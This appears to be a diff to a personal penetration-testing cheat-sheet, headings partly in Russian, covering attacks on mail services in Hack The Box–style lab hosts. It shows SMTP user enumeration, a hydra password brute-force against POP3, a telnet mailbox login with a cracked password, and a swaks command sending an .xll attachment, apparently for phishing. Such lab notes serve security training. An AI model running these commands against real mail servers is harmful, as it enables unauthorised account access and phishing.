@@ -1,6 +1,31 @@
 # MAIL
 # MAIL
-  Отправка по smtp
+
+# User Enumeration
+
+    smtp-user-enum -M RCPT -U users.txt -D inlanefreight.htb -t 10.129.203.12
+
+# Подбор пароля почты
+
+    hydra -l 'marlin@inlanefreight.htb' -P passwords.txt -f 10.129.203.12  pop3
+  
+# Login via Telnet port 110 pop3
+
+    telnet $ip 110   
+    USER marlin@inlanefreight.htb
+ 
+    PASS poohbear
+
+    LIST
+
+    RETR 1
+
+    Hi admin,
+
+    How can I change my password to something more secure? 
+
+
+#  Отправка по smtp
   
   swaks --from amra@axlle.htb --to accounts@axlle.htb --body "Hello" --header "Hello" --attach @test.xll
 
